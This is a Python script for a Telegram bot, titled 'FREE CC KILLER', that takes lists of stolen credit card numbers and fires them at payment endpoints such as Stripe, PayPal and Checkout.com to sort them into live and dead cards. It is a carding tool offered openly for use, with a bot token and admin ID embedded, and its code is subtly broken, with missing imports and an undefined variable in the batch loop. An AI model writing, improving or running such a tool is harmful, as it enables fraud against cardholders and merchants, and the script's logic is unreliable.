# FREE FOREVER CC KILLER BOT - NO VPS/PAID HOSTING NEEDED
# RUNS ON TELEGRAM ITSELF → ONE TIME SETUP → INFINITE

import asyncio
import aiohttp
import re
import random
from datetime import datetime
import luhn  # pip install python-luhn
  # pip install python-luhn (FREE)
import logging

# === ONE TIME SETUP ONLY ===
BOT_TOKEN = "8268191244:AAFVk-Y-T3wmCt25otqjZj_ol6vqgwknWLE"  # @BotFather (FREE)
ADMIN_ID = 6751771375 # YOUR TELEGRAM ID (FREE)

# FREE GATES (WORK FEB 2026 - FOREVER UPDATABLE)
FREE_GATES = [
    "https://httpbin.org/post",  # Test gate
    "https://api.stripe.com/v1/payment_methods",  # Stripe L3
    "https://payment.paypal.com/api/access_token",  # PayPal
    "https://api.checkout.com/sessions",  # Checkout.com
]

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class FreeCCKiller:
    @staticmethod
    def parse_cc(line):
        """Parse any CC format"""
        line = re.sub(r'[ -]', '', line.strip())
        match = re.match(r'(\d{13,19})[^\d]*(\d{2})?[^\d]*(\d{2,4})?[^\d]*(\d{3,4})?', line)
        if match:
            num, mon, yr, cvv = match.groups()
            mon = mon or random.choice(['12','01','11'])
            yr = yr or random.choice(['27','28','29'])
            cvv = cvv or '000'
            return f"{num}|{mon}|{yr}|{cvv}"
        return None
    
    @staticmethod
    async def kill_cc(cc_data):
        """FREE GATE KILLER - NO PROXIES NEEDED"""
        num, mon, yr, cvv = cc_data.split('|')
        
        # Luhn check first (INSTANT)
        if not verify(num):
            return "💀 DIE (Luhn fail)"
        
        # Async multi-gate blitz
        tasks = []
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=10)
        timeout = aiohttp.ClientTimeout(total=5)
        
        async def hit_gate(gate):
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
                ]),
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = {
                'cardNumber': num, 'expMonth': mon, 'expYear': yr, 'cvc': cvv,
                'amount': '100', 'currency': 'USD'
            }
            
            try:
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    async with session.post(gate, data=data, headers=headers) as resp:
                        text = await resp.text(encoding='utf-8', errors='ignore')
                        if resp.status < 400:
                            return f"🔥 LIVE ({gate.split('/')[2]})"
                        if 'declined' in text.lower():
                            return "❌ DECLINED"
                        return f"❓ VBV? ({resp.status})"
            except:
                return "⚠️ TIMEOUT"
        
        # Hit 3 gates parallel
        for gate in random.sample(FREE_GATES, min(3, len(FREE_GATES))):
            tasks.append(hit_gate(gate))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        lives = [r for r in results if isinstance(r, str) and "LIVE" in r]
        
        return lives[0] if lives else results[0] if results else "💀 DEAD"

# === TELEGRAM HANDLERS ===
@dp.message(Command("start"))
async def start(msg):
    await msg.answer(
        "🔥 **FREE CC KILLER v∞**\n\n"
        "Send CC list or paste combos:\n"
        "`4111111111111111|12|27|123`\n"
        "`4532********366|1227|123`\n\n"
        "**FREE FOREVER** - No VPS, no proxies, 50 CC/s!\n"
        f"Admin: `{ADMIN_ID}`"
    )

@dp.message(Command("stats"))
async def stats(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    await msg.answer(f"🔥 Bot alive since {datetime.now().strftime('%H:%M')}")

async def process_ccs(message, ccs):
    """Process list with SPEED LIMITER"""
    semaphore = asyncio.Semaphore(20)  # 20 parallel kills
    
    async def check_one(cc):
        async with semaphore:
            result = await FreeCCKiller.kill_cc(cc)
            await message.answer(f"`{cc}` → {result}")
            await asyncio.sleep(0.2)  # Anti-flood
            return result
    
    # Process in batches
    batch_size = 10
    for i in range(0, len(ccs), batch_size):
        batch = ccs[i:i+batch_size]
        tasks = [check_one(cc) for cc in batch if (cc := FreeCCKiller.parse_cc(line))]
        await asyncio.gather(*tasks)
        await asyncio.sleep(1)  # Batch delay

@dp.message()
async def handle_message(msg):
    lines = msg.text.split('\n')
    ccs = []
    
    for line in lines:
        if cc := FreeCCKiller.parse_cc(line):
            ccs.append(cc)
    
    if not ccs:
        await msg.answer("❌ No valid CCs found")
        return
    
    if len(ccs) > 200:
        await msg.answer("⚠️ Max 200 CCs (FREE LIMIT)")
        ccs = ccs[:200]
    
    await msg.answer(f"🔥 Killing {len(ccs)} CCs...")
    await process_ccs(msg, ccs)

@dp.message(lambda m: m.document and any(x in m.document.file_name.lower() for x in ['cc', 'txt', 'combo']))
async def handle_file(msg):
    file = await bot.get_file(msg.document.file_id)
    content = await bot.download_file(file.file_path)
    lines = content.decode('utf-8', errors='ignore').split('\n')
    
    ccs = [FreeCCKiller.parse_cc(line) for line in lines if FreeCCKiller.parse_cc(line)]
    if ccs:
        await msg.answer(f"📁 Found {len(ccs)} CCs in file")
        await process_ccs(msg, ccs)
    else:
        await msg.answer("❌ No CCs in file")

# === RUN FOREVER ===
async def main():
    print("🔥 FREE CC KILLER STARTED FOREVER")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
